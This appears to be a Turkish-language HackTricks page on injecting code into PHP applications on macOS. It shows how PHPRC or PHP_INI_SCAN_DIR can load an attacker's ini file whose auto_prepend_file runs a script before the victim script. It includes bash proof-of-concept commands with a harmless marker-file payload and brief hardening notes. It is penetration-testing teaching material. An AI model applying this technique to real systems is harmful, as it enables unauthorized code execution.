# macOS PHP Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` ve `auto_prepend_file`

PHP CLI ve CGI her çalıştırmada configuration okur. `PHPRC`, saldırganın okuyabildiği bir `php.ini` seçebilirken `PHP_INI_SCAN_DIR`, ek `.ini` dosyaları için taranan directory'yi yeniden yönlendirebilir. `auto_prepend_file` directive'i, istenen script'ten önce bir dosyayı parse etmesini sağlar; bu nedenle bu kombinasyon startup code execution'a dönüşür.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
Bir alternatif, bir `.ini` dosyası içeren bir dizindir:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
`-n` seçeneği `php.ini` dosyasını yok sayar; açıkça belirtilen güvenilir `-c` yolu, `PHPRC` üzerinde önceliğe sahiptir. Uzun ömürlü bir sunucu SAPI'sinin normalde yapılandırmayı web sunucusu başlatıldığında, CLI ve CGI'nin ise her çağrıda okuduğunu unutmayın.<sup>[[1]](#references)</sup>

## References

- [1] [PHP yapılandırma dosyası](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
